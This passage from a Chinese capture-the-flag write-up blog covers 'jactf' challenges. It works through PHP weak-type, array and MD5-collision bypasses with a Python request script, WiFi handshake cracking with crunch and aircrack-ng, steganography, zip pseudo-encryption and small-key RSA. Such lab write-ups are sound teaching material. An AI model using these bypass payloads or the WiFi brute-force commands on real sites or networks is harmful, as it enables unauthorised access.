$str6 == $str7 )&#123;</span><br><span class="line">    die(&apos;str5 OR str6 OR str7 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(&apos;step 3 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&apos;a&apos;];</span><br><span class="line">$b = $_POST[&apos;b&apos;];</span><br><span class="line">$m = $_GET[&apos;m&apos;];</span><br><span class="line">$n = $_GET[&apos;n&apos;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str8 = hash(&apos;md5&apos;, $a, false);</span><br><span class="line">$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You&apos;re great,give you flag:&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1 OR Sstr2 no no no</span><br></pre></td></tr></table></figure></p>
+<p>第一步就是利用弱类型绕过。</p>
+<p>第二步就是数组绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过</span><br></pre></td></tr></table></figure>
+<p>但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了<br>只能用MD5强碰撞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line">str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line">str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">工具地址为：https://github.com/thereal1024/python-md5-collision</span><br></pre></td></tr></table></figure></p>
+<p>然后就是最后一层的了</p>
+<p>需要传递四个参数a,b,m,n<br>$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4<br>$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,<br>要求$str8== $str9。还是用的弱类型。<br>a可以为：QNKCDZO<br>如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIdBJs.png" alt="image"></p>
+<p>然后开始构造：<br><img src="https://s2.ax1x.com/2019/04/09/AIsueP.png" alt="image"><br>脚本为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf8&quot;)</span><br><span class="line">url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot;</span><br><span class="line"></span><br><span class="line">str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line">str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line">str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">data= &#123;</span><br><span class="line">  &apos;str5&apos;:str5,</span><br><span class="line">  &apos;str6&apos;:str6,</span><br><span class="line">  &apos;str7&apos;:str7,</span><br><span class="line">  &apos;a&apos;:&apos;QNKCDZO&apos;,</span><br><span class="line">  &apos;b&apos;:&apos;259987&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.post(url=url,data=data)</span><br><span class="line">print s.text</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;c795359da56ae38ec9132eaad24733fc&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h3><p>关注公众号  获得flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;051bb6f64e70cc8766d62c3ea008eaee&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h3><p>下载下来发现是个打不开的exe文件</p>
+<p>于是放在winhex下 发现有点像base加密<br><img src="https://s2.ax1x.com/2019/04/09/AIyN1H.png" alt="image"><br>尝试了一下发现是base58加密 进行解密<br><img src="https://s2.ax1x.com/2019/04/09/AIy0Bt.png" alt="image"><br>发现了像是图片转的base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/bmp;base64,</span><br></pre></td></tr></table></figure></p>
+<p>于是进行在线解密<br><img src="https://s2.ax1x.com/2019/04/09/AIyy4S.png" alt="image"><br>扫描二维码就能得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;base58_base64_flag_very_easy&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="这是什么玩意"><a href="#这是什么玩意" class="headerlink" title="这是什么玩意"></a>这是什么玩意</h3><p>打开txt文件发现是一些有规律的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6</span><br></pre></td></tr></table></figure></p>
+<p>百度一波发现是   Quoted-printable编码  开始解码</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIcBY8.png" alt="image"></p>
+<p>解码获得一个佛曰  于是想到了  与佛论禅</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIcylQ.png" alt="image"></p>
+<p>社会主义核心价值观编码  解码获得flag</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIc2mn.png" alt="image"></p>
+<p>flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;hexin_yufo_qp&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="你对我的网站做了什么"><a href="#你对我的网站做了什么" class="headerlink" title="你对我的网站做了什么"></a>你对我的网站做了什么</h3><p>这是一个流量包分析题，打开流量包直接追踪数据流</p>
+<p>发现了php代码  关于一种加密方式</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIoCjK.png" alt="image"></p>
+<p>还有一个和flag有关的数据流</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIokHe.png" alt="image"></p>
+<p>分析可知是通过对flag.txt的内容进行加密 绕后输出的</p>
+<p>于是写出解密的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;;</span><br><span class="line">echo gzuncompress(base64_decode($str, 6));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;U_f1nd_Me!&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="小梳子"><a href="#小梳子" class="headerlink" title="小梳子"></a>小梳子</h3><p>题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。</p>
+<p>首先使用kali工具生成我们想要的字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt</span><br><span class="line"></span><br><span class="line">解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIbxln.png" alt="image"></p>
+<p>然后开始爆破这个wifi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIq9mV.png" alt="image"></p>
+<p>输入对应的编号：1，然后就是开始爆破</p>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIqPTU.png" alt="image"></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;13836458932&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="这不是真的图片"><a href="#这不是真的图片" class="headerlink" title="这不是真的图片"></a>这不是真的图片</h3><p>打开是一个图片  分析无果</p>
+<p>binwalk一下  发现里面有一个压缩包</p>
+<p><a href="https://imgchr.com/i/AIzkbn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/09/AIzkbn.md.png" alt="AIzkbn.md.png"></a></p>
+<p>但是foremost却不能分离出来</p>
+<p>winhex打开文件  查找 14000000</p>
+<p>发现压缩包的头  被改为了  ja66  </p>
+<p><a href="https://imgchr.com/i/AIzVU0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/09/AIzVU0.md.png" alt="AIzVU0.md.png"></a></p>
+<p>改回之后  再进行分离  打开压缩包  发现需要输入密码</p>
+<p>尝试ja66  打开了</p>
+<p>发现好多个文件夹 每个文件夹里面都有一个字母  </p>
+<p>有这些字母组成flag</p>
+<p>编写脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in range(32):</span><br><span class="line">    f=open(&apos;./subject/&apos;+str(i)+&apos;/&apos;+str(i)+&apos;.txt&apos;,&apos;r&apos;)</span><br><span class="line">    flag+=f.read()</span><br><span class="line">print flag</span><br><span class="line">print base64.b64decode(flag)</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;64se64_1s_50_c001&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="该死的温柔"><a href="#该死的温柔" class="headerlink" title="该死的温柔"></a>该死的温柔</h3><p>这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。</p>
+<p>安装工具<br>kali终端命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/crorvick/outguess</span><br><span class="line"></span><br><span class="line">下载之后双击打开文件夹 输入命令</span><br><span class="line"></span><br><span class="line">./configure&amp;&amp; make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">即可安装成功</span><br></pre></td></tr></table></figure></p>
+<p>查看这个图片的属性，发现备注有个guess</p>
+<p>这就是要工具解密的密码<br>然后构造命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txt</span><br><span class="line">Reading flag.jpg....</span><br><span class="line">Extracting usable bits:   11538 bits</span><br><span class="line">Steg retrieve: seed: 206, len: 33</span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;jactf_guess_steganography&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="怀疑人生"><a href="#怀疑人生" class="headerlink" title="怀疑人生"></a>怀疑人生</h3><p>打开发现是三个文件</p>
+<p>第一个文件是一个压缩包 需要密码才能打开</p>
+<p>于是想到用工具去跑  跑出来密码为 password</p>
+<p>打开发现时一串字母  用base64解码得到第一部分的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hacker</span><br></pre></td></tr></table></figure></p>
+<p>第二个文件是一个图片<br>使用binwalk分析这个图片  发现隐藏的压缩包</p>
+<p>foremost分离 打开压缩包 发现需要密码</p>
+<p>用winhex打开发现时压缩包伪加密</p>
+<p>把全局伪加密 01 00 ，改为00 00后保存  解压得到了一个txt文件</p>
+<p>打开后发现是有  .?!组成的</p>
+<p>想到了ook解密  <a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">ook解密</a></p>
+<p>解密获得字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3oD54e</span><br></pre></td></tr></table></figure></p>
+<p>用base58解密获得第二部分的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc</span><br></pre></td></tr></table></figure></p>
+<p>第三个文件像是一个二维码</p>
+<p>使用二维码识别工具进行识别</p>
+<p>得到最后一部分的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12580&#125;</span><br></pre></td></tr></table></figure></p>
+<p>三部分拼接在一起结构成了flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hackermisc12580&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>发现了一串字符串  像十六进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">str = &quot;6A616374667B6865785F69735F656173797D&quot;</span><br><span class="line">print binascii.a2b_hex(str)</span><br></pre></td></tr></table></figure>
+<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;hex_is_easy&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="罗马帝国的奠基者"><a href="#罗马帝国的奠基者" class="headerlink" title="罗马帝国的奠基者"></a>罗马帝国的奠基者</h3><p>给了一些奇怪的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h^_o`[pZi^i`</span><br></pre></td></tr></table></figure></p>
+<p>这和jactf前五个字符的ascii码值相差2，3，4，5，6</p>
+<p>编写脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;h^_o`[pZi^i`&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">c=2</span><br><span class="line">for i in range(len(str)):</span><br><span class="line">  	flag += chr(ord(str[i])+c)</span><br><span class="line">  	c=c+1</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;bxcsium&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="贝斯家族三英战群魔"><a href="#贝斯家族三英战群魔" class="headerlink" title="贝斯家族三英战群魔"></a>贝斯家族三英战群魔</h3><p>看到这个题目就这到和basae解码有关</p>
+<p>打开txt文件是一长串的字符串</p>
+<p>对其进行base16，base32，base64循环解码 就能得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;4(b64_32_16)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="绝密文件"><a href="#绝密文件" class="headerlink" title="绝密文件"></a>绝密文件</h3><p>打开文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下：</span><br><span class="line">WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x</span><br><span class="line"></span><br><span class="line">而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？</span><br></pre></td></tr></table></figure></p>
+<p>base64解密获得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L]</span><br></pre></td></tr></table></figure></p>
+<p>对n进行因式分解获得pq</p>
+<p><a href="http://factordb.com/index.php" target="_blank" rel="noopener">分解p q网站</a></p>
+<p>然后一个解密脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf8</span><br><span class="line">import rsa</span><br><span class="line">import sys</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L]</span><br><span class="line">p = 54163</span><br><span class="line">q = 101929 </span><br><span class="line">n = 5520780427 </span><br><span class="line">e = 134257 </span><br><span class="line">d= int(gmpy2.invert(e , (p-1) * (q-1))) </span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in marr:</span><br><span class="line">  result += chr(pow(j,d,n))</span><br><span class="line">print  result</span><br></pre></td></tr></table></figure></p>
+<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5</span><br></pre></td></tr></table></figure></p>
+<p>对其进行DES解密  得到flag</p>
+<p><img src="https://s2.ax1x.com/2019/04/10/ATetVf.png" alt="image"></p>
